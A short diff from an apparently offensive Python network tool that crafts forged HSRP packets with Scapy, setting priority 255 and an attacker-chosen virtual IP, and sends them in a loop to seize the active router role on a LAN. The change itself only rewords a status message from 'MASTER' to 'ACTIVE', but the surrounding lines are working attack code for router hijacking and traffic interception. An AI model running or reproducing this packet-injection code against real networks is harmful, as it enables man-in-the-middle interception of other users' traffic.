@@ -43,7 +43,7 @@ def inject(interface, group, attackerip, vip, auth):
     UDP_layer = UDP(sport=1985, dport=1985)
     evil_hsrp = HSRP(group=args.group, priority=255, virtualIP=args.vip, auth=args.auth)
     crafted = L2frame / L3packet / UDP_layer / evil_hsrp
-    print ("\n[+] We begin to intercept the role of the MASTER router...")
+    print ("\n[+] We begin to intercept the role of the ACTIVE router...")
     sendp(crafted, iface=args.interface, inter=3, loop=1, verbose=1)
 
 args = take_arguments()
